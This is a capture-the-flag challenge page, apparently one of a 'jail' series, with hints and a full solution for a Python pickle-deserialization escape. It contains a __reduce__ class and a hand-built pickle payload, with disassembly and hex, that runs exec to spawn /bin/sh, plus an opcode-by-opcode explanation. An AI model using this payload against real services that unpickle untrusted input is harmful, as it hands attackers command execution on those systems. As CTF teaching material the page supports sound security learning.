# jail 1

## restrictions

none

## hints

<details>
    <summary>Hint 1</summary>

Try searching "python pickle exploit" on google.

</details>

<details>
    <summary>Hint 2</summary>

If you can read python well, take a look at [pickle.py](https://github.com/python/cpython/blob/3.9/Lib/pickle.py) from the python source code. I think the REDUCE opcode will be helpful here.

</details>

<details>
    <summary>Hint 3</summary>

```python
import os

class RCE:
    def __reduce__(self):
        return os.system, ('/bin/sh',)
```

</details>

<details>
    <summary>Solution & Explanation</summary>

tl;dr - `exec("__import__('os').system('/bin/sh')")`

solve.py
```py
from pickle import *
from pickletools import dis

p = b""

p += PROTO
p += b'\x05'
p += GLOBAL
p += b'builtins\n'
p += b'exec\n'
p += STRING
p += b'"__import__(\'os\').system(\'/bin/sh\')"\n'
p += TUPLE1
p += REDUCE
p += STOP

dis(p)
print("="*50)
print(p.hex())

```

output
```
    0: \x80 PROTO      5
    2: c    GLOBAL     'builtins exec'
    17: S    STRING     "__import__('os').system('/bin/sh')"
    55: \x85 TUPLE1
    56: R    REDUCE
    57: .    STOP
highest protocol among opcodes = 2
==================================================
8005636275696c74696e730a657865630a53225f5f696d706f72745f5f28276f7327292e73797374656d28272f62696e2f73682729220a85522e
```

### explanation:

`    0: \x80 PROTO      5`

Every pickle should start with a PROTO opcode, followed by a bytes representation of the protocol version (e.g. `\x05` for protocol version 5)

`    2: c    GLOBAL     'builtins exec'`

Second, we import builtins in the background and retrieve the exec function, which is used to execute code.

`    17: S    STRING     "__import__('os').system('/bin/sh')"`

We retrieve the string `"__import__('os').system('/bin/sh')"` that we will use to execute code later

`    55: \x85 TUPLE1`

We wrap that string inside of a tuple, because the python pickle uses the spread operator (`*args`) with the argument iterable.

`    56: R    REDUCE`

The REDUCE opcode calls the 2nd highest item on the stack (a function), which is builtins.exec, with the argument of the topmost item on the stack (an iterable). So, `builtins.exec("__import__('os').system('/bin/sh')")`

`    57: .    STOP`

Every pickle stops with the STOP opcode. The stack must have one object on top of it by the end, something to retrieve from the deserialization. The exec() function puts a None on the stack as the only item on the stack, so we don't have to worry about having one final item on the stack.

</details>
